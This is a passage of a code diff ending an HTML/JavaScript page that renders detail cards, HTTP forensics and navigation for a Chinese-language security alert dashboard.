+    panelsHtml += '<div class="panel"><h4>' + a.panels[i].title + '</h4><div class="body">' + a.panels[i].body + '</div></div>';
+  }
+
+  // 原始数据区域
+  var rawHtml = '';
+  if (a.rawReq && a.rawResp) {
+    rawHtml = '<div style="margin: 14px 18px 14px">' +
+      '<div style="display:flex;align-items:center;margin-bottom:9px"><h3 style="margin:0;font-size:15px">HTTP 请求与响应取证</h3><span style="margin-left:auto;color:#8d99a5;font-size:12px">会话 ' + a.sessionId + ' · 传感器 ' + a.sensor + '</span></div>' +
+      '<div class="subgrid">' +
+      '<div><div class="raw-full">' + escapeHtml(a.rawReq) + '</div></div>' +
+      '<div><div class="raw-full">' + escapeHtml(a.rawResp) + '</div></div>' +
+      '</div></div>';
+  }
+
+  // 导航按钮
+  var navHtml = '<div class="nav-btns">' +
+    '<button class="nav-btn" onclick="switchAlert(' + (idx - 1) + ')"' + (idx === 0 ? ' disabled' : '') + '>◀ 上一条</button>' +
+    '<button class="nav-btn" onclick="switchAlert(' + (idx + 1) + ')"' + (idx === ALERTS.length - 1 ? ' disabled' : '') + '>下一条 ▶</button>' +
+    '</div>';
+
+  container.innerHTML =
+    '<div class="detail-card">' +
+    '<div class="detail-header">' +
+    '<h3>告警详情 #' + (idx + 1) + '</h3>' +
+    '<span class="alert-id">日志ID: ' + a.id + '</span>' +
+    '<span class="alert-time">' + a.time + '</span>' +
+    '<div class="badges">威胁级别 <span class="badge ' + a.levelClass + '">' + a.level + '</span> 攻击结果 <span class="badge success">攻击成功</span></div>' +
+    navHtml +
+    '</div>' +
+    '<div class="event-summary"><strong>事件概述：</strong>' + a.summary + '</div>' +
+    '<div class="scorebar">' + scoreHtml + '</div>' +
+    '<div class="info-grid">' + gridHtml + '</div>' +
+    rawHtml +
+    (panelsHtml ? '<div style="margin:0 18px 14px"><div style="display:flex;align-items:center;margin-bottom:9px"><h3 style="margin:0;font-size:15px">检测与关联证据</h3></div><div class="subgrid">' + panelsHtml + '</div></div>' : '') +
+    '</div>';
+
+  // 更新表格高亮
+  var rows = document.querySelectorAll('#alert-table-body tr');
+  for (var i = 0; i < rows.length; i++) {
+    rows[i].className = (i === idx) ? 'active' : '';
+  }
+
+  // 更新指示器
+  document.getElementById('curIdx').textContent = (idx + 1);
+
+  currentIdx = idx;
+}
+
+function switchAlert(idx) {
+  if (idx < 0 || idx >= ALERTS.length) return;
+  renderDetail(idx);
+  // 滚动详情到可见区域
+  document.getElementById('detail-container').scrollIntoView({behavior:'smooth',block:'start'});
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// 初始渲染第一条告警
+renderDetail(0);
+</script>
+</body>
+</html>
